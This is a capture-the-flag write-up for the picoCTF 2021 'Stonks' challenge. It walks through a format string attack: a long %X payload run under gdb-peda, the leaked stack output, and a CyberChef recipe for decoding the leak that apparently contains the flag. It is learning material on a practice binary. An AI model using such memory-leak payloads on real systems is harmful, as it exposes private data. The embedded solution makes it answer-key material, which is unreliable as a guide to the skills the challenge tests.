# Ref
- https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Binary%20Exploitation/Stonks/Stonks.md

# Learned
- How to use `gdb`, `gbdgui`, `gdb-peda`  
https://nodachisoft.com/common/jp/article/jp000028/  
http://ysserve.wakasato.jp/sugsi/Lecture/c2/e_11-03-01_gdb.html  
- The way to use `gcc`  
- `Format String Attack`  
https://qiita.com/twrcd1227/items/c1b0eefb9cf2736737a1  
https://www.k-cube.co.jp/wakaba/server/format.html  

# Procedure
1. modify source code for debug  
In this case, I don't have to change source code.  
Flag file called 'api' is just needed.
```bash
$ touch api
$ echo 'AAAAAAAAA' > ./api
```

2. compile the modified code and check the motion with gdb
```bash
$ gcc -g -Wno-format-security vuln.c -o vuln_test
$ gdb
``` 

3. try `Format-String-Attack`  
Input a sequence of "%X".
But the result of "HEX" cannot be decoded ASCII simply which show a kind of a flag.

3. test a specification of `Format-String-Attack`  
Check the way to display when you set "CCCCBBBBCCCCBBBBCCCCBBBBCCCCAAAA" into "api" file and input a sequence of "%X".  
Then, you find "BBBB" and "AAAA" is skipped

    Ref.

    | ASCII string | Hex |  
    | ---- | ---- |  
    | A | 41 |  
    | B | 42 |  
    | C | 43 |  

```bash
$ echo 'CCCCBBBBCCCCBBBBCCCCBBBBCCCCAAAA' > ./api
$ cat api
CCCCBBBBCCCCBBBBCCCCBBBBCCCCAAAA
$ gdb vuln_test
gdb-peda$ b 91
gdb-peda$ run
1
gdb-peda$ n
%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X,%X
gdb-peda$ n
gdb-peda$ n
1,1,F7E92A37,19,5555A9A0,FFFFDEE0,555592A0,0,555596D0,5555A980,5555A9A0,43434343,43434343,43434343,43434343,5555000A,F7F94600,F7FFD040,F7E0AF43,14,F7F98780,55556151,F7DFF02A,0,F7DC476D,0,FFFFDFD0,FFFFE0E8,4C20C900,FFFFDFD0,5555580C,FFFFE0E8,1F8BFBFF,FFFFE339,64,555592A0,4C20C900,1,F7DA7D90,0,55555725,FFFFE0D0,FFFFE0E8,0,19D806BA,FFFFE0E8,55555725,55557D50,F7FFD040,A61A06BA,E35206BA,0,0,0,0,0,4C20C900,0,F7DA7E40,FFFFE0F8,55557D50,F7FFE2E0,0,0,55555220,FFFFE0E0,0,0,55555245,FFFFE0D8,1C,1,FFFFE34C,0,FFFFE393,FFFFE3A3,FFFFE3B0,FFFFE6B7,FFFFE6CB,FFFFE6F1,FFFFE6FC,FFFFE716,FFFFE73E,FFFFE756,FFFFE777,FFFFE7A7,FFFFE7DC,FFFFE7FB,FFFFE810,FFFFE820,FFFFE82A,FFFFE837,FFFFE84A,FFFFE867,FFFFE86F,FFFFE8B0,FFFFE8F4,FFFFEEE3,FFFFEF53,FFFFEF9C
gdb-peda$ Quit
$ echo "1,1,F7E92A37,19,5555A9A0,FFFFDEE0,555592A0,0,555596D0,5555A980,5555A9A0,43434343,43434343,43434343,43434343,5555000A,F7F94600,F7FFD040,F7E0AF43,14,F7F98780,55556151,F7DFF02A,0,F7DC476D,0,FFFFDFD0,FFFFE0E8,4C20C900,FFFFDFD0,5555580C,FFFFE0E8,1F8BFBFF,FFFFE339,64,555592A0,4C20C900,1,F7DA7D90,0,55555725,FFFFE0D0,FFFFE0E8,0,19D806BA,FFFFE0E8,55555725,55557D50,F7FFD040,A61A06BA,E35206BA,0,0,0,0,0,4C20C900,0,F7DA7E40,FFFFE0F8,55557D50,F7FFE2E0,0,0,55555220,FFFFE0E0,0,0,55555245,FFFFE0D8,1C,1,FFFFE34C,0,FFFFE393,FFFFE3A3,FFFFE3B0,FFFFE6B7,FFFFE6CB,FFFFE6F1,FFFFE6FC,FFFFE716,FFFFE73E,FFFFE756,FFFFE777,FFFFE7A7,FFFFE7DC,FFFFE7FB,FFFFE810,FFFFE820,FFFFE82A,FFFFE837,FFFFE84A,FFFFE867,FFFFE86F,FFFFE8B0,FFFFE8F4,FFFFEEE3,FFFFEF53,FFFFEF9C" | grep --color -E "|43"
1,1,F7E92A37,19,5555A9A0,FFFFDEE0,555592A0,0,555596D0,5555A980,5555A9A0,43434343,43434343,43434343,43434343,5555000A,F7F94600,F7FFD040,F7E0AF43,14,F7F98780,55556151,F7DFF02A,0,F7DC476D,0,FFFFDFD0,FFFFE0E8,4C20C900,FFFFDFD0,5555580C,FFFFE0E8,1F8BFBFF,FFFFE339,64,555592A0,4C20C900,1,F7DA7D90,0,55555725,FFFFE0D0,FFFFE0E8,0,19D806BA,FFFFE0E8,55555725,55557D50,F7FFD040,A61A06BA,E35206BA,0,0,0,0,0,4C20C900,0,F7DA7E40,FFFFE0F8,55557D50,F7FFE2E0,0,0,55555220,FFFFE0E0,0,0,55555245,FFFFE0D8,1C,1,FFFFE34C,0,FFFFE393,FFFFE3A3,FFFFE3B0,FFFFE6B7,FFFFE6CB,FFFFE6F1,FFFFE6FC,FFFFE716,FFFFE73E,FFFFE756,FFFFE777,FFFFE7A7,FFFFE7DC,FFFFE7FB,FFFFE810,FFFFE820,FFFFE82A,FFFFE837,FFFFE84A,FFFFE867,FFFFE86F,FFFFE8B0,FFFFE8F4,FFFFEEE3,FFFFEF53,FFFFEF9C
```  
CCCCBBBBCCCCBBBBCCCCBBBBCCCCAAAA  
-> .... ,43434343,43434343,43434343,43434343, ....  

try some text of api.  
ABCDEEEEABCDEEEEABCDEEEE  
-> .... ,44434241,44434241,44434241, ....  

Then the output of this `Format-String-Attack` shows each 4 strings are ignored by 4 strings and the rest of 4 strings are shown with reverse endianess.  
EEEE is ignored.  
ABCD is 44434241(DCBA).  
Probablry input strings is sequent data like big endian but those are stored with little endian on memory.  
So when you pick the data, it is displayed by the chunk of data stored with litile endian.  

5. CyberCheff  
connect a server following the problem text, try `Format-String-Attack` and get data which will contains a flag.  
Using CyberChef, remove garbage data, modify endianess and decode it from HEX to ascii.

TIPS: picking the necessary data, dealting with by 4 strings is important so you have to delete some output strings for getting answer because the length of output depends on the number of your input.

[recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'(.%7B8%7D)'%7D,'$1%5C%5Cn',true,false,true,false)Swap_endianness('Hex',4,true)From_Hex('Auto')&input=NDEwODA0QjAwMDgwNDg5QzNGN0VDQUQ4MEZGRkZGRkZGMTk4QkIxNjBGN0VEODExMEY3RUNBREM3MDk4QkMxODAxOThCRDNGMDk4QkQ0MTA2RjYzNjk3MDdCNDY1NDQzMzA2QzVGNDkzNDVGNzQzNTZENUY2QzZDMzA2RDVGNzk1Rjc5MzM2RTM1Mzg2MTMwMzIzNTY1MzNGRkVDMDA3REY3RjA1QUY4RjdFRDg0NDBBRjRFMzEwMDEwRjdENjdDRTlGN0VEOTBDMEY3RUNBNUMwRjdFQ0EwMDBGRkVDMDg2OEY3RDU4NjhERjdFQ0E1QzA4MDQ4RUNBRkZFQzA4NzQwRjdFRUNGMDk4MDRCMDAwRjdFQ0EwMDBGN0VDQUUyMEZGRUMwOEE4RjdFRjJENTBGN0VDQjg5MEFGNEUzMTAwRjdFQ0EwMDA4MDRCMDAwRkZFQzA4QTg4MDQ4Qzg2OThCQjE2MEZGRUMwODk0RkZFQzA4QTg4MDQ4QkU5RjdFQ0EzRkMwRkZFQzA5NUNGRkVDMDk1NDExOThCQjE2MEFGNEUzMTAwRkZFQzA4QzAwMEY3RDBERkExRjdFQ0EwMDBGN0VDQTAwMDBGN0QwREZBMTFGRkVDMDk1NEZGRUMwOTVDRkZFQzA4RTQxMEY3RUNBMDAwRjdFRUQ3MEFGN0YwNTAwMDBGN0VDQTAwMDAwRDQ3NEFBNjJBRERCRUM3MjAwMDE4MDQ4NjMwMEY3RUYyRDUwRjdFRUQ5NjA4MDRCMDAw)
```json
[
  { "op": "Find / Replace",
    "args": [{ "option": "Regex", "string": "(.{8})" }, "$1\\n", true, false, true, false] },
  { "op": "Swap endianness",
    "args": ["Hex", 4, true] },
  { "op": "From Hex",
    "args": ["Auto"] }
]
```